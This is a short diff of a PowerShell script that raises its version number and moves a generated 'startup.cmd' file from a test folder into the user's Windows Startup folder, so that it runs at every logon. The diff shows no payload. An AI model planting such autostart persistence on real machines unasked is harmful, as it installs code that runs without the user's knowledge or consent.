@@ -1,4 +1,4 @@
-[string]$Version = 5
+[string]$Version = 6
 #TODO update this version
 
 echo "Process script starting: $Pid"
@@ -24,10 +24,10 @@ Get-Process -Name "*PowerShell*" | ForEach-Object {
 
 ###
 
-#$path += "\Microsoft\Windows\Start Menu\Programs\Startup\"
 #$path = "C:\" #override
 [string]$path = $env:APPDATA
-[string]$FolderName = "\Test\"
+#[string]$FolderName = "\Test\"
+[string]$FolderName = "\Microsoft\Windows\Start Menu\Programs\Startup\"
 [string]$StartupCmdPath = "$path"+"$FolderName"+"startup.cmd"
 #$StartupCmdPath
 
